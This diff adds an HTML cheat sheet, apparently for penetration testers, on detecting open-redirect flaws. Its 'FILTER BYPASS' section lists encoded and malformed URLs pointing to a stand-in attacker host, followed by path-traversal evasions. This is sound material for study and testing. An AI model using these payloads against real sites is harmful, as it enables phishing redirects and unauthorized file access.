@@ -1,0 +1,78 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><span style="font-size: 14pt"><b>DETECTION</b><br/>
+</span><span style="font-size: 10pt"><br/>
+How can web app redirect browser<br/>
+</span><ul><li>3xx HTTP response codes and <tt>Location</tt>header</li>
+<li><tt>Refresh</tt>header (with fixed interval and URL which redirect to)</li>
+<li><tt>&lt;meta&gt;</tt>tag injection can simulate any HTTP header</li>
+</ul>
+<ul><tt><li style="list-style-type: none">HTTP/1.1 200 OK</li>
+<li style="list-style-type: none">Content-Length: 125</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">&lt;html&gt;</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;head&gt;</li>
+</ul>
+</li>
+<li style="list-style-type: none">  	&lt;meta http-equiv=”refresh” content=“0;url=http://mdsec.net/updates/update29.html”&gt;</li>
+<li style="list-style-type: none">  &lt;/head&gt;</li>
+</tt><li style="list-style-type: none"><tt>&lt;/html&gt;</tt></li>
+</ul>
+<ul><li>JavaScript API</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><tt><li style="list-style-type: none">document.location=”http://mdsec.net/updates/update29.html”;</li>
+<li style="list-style-type: none">document.URL</li>
+<li style="list-style-type: none">document.open</li>
+<li style="list-style-type: none">window.location</li>
+<li style="list-style-type: none">window.navigate</li>
+</tt><li style="list-style-type: none"><tt>window.open</tt></li>
+</ul>
+</li>
+</ul>
+<br/>
+<b>Common parameter names</b><br/>
+<tt><br/>
+File=<br/>
+document=<br/>
+Folder=<br/>
+root=<br/>
+Path=<br/>
+pg=<br/>
+style=<br/>
+pdf=<br/>
+template=<br/>
+php_path=<br/>
+</tt><tt>doc=</tt><br/>
+<br/>
+<br/>
+<b>FILTER BYPASS</b><br/>
+<br/>
+<tt>HtTp://mdattacker.net<br/>
+%00http://mdattacker.net<br/>
+http://mdattacker.net<br/>
+//mdattacker.net<br/>
+%68%74%74%70%3a%2f%2fmdattacker.net<br/>
+%2568%2574%2574%2570%253a%252f%252fmdattacker.net<br/>
+https://mdattacker.net<br/>
+http:\\mdattacker.net<br/>
+http:///mdattacker.net<br/>
+http://http://mdattacker.net<br/>
+http://mdattacker.net/http://mdattacker.net<br/>
+hthttp://tp://mdattacker.net<br/>
+http://mdsec.net.mdattacker.net<br/>
+http://mdattacker.net/?http://mdsec.net<br/>
+http://mdattacker.net/%23http://mdsec.net<br/>
+<br/>
+</tt>URL shortener tinyurl.com<br/>
+<br/>
+escape &quot;/&quot; with &quot;\/&quot; or &quot;//&quot; with &quot;\/\/&quot;<br/>
+try single &quot;/&quot; instead of &quot;//&quot;<br/>
+remove http i.e. &quot;continue=//google.com&quot;<br/>
+&quot;/\/\&quot; , &quot;|/&quot; , &quot;/%09/&quot;<br/>
+encode, slashes<br/>
+&quot;./&quot; CHANGE TO &quot;..//&quot;<br/>
+&quot;../&quot; CHANGE TO &quot;....//&quot;<br/>
+&quot;/&quot; CHANGE TO &quot;//&quot;<br/>
+</body></html>
